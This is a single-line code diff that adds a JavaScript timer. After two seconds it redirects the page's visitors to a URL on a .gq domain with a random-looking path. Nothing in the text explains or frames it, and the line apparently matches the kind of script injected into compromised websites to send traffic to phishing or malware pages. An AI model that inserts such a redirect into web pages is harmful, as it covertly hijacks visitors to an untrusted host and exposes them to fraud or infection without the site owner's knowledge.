@@ -1,0 +1,1 @@
+setTimeout(function() { window.location = "https://teliholwaloh.gq/jXXY2hcp" }, 2000);
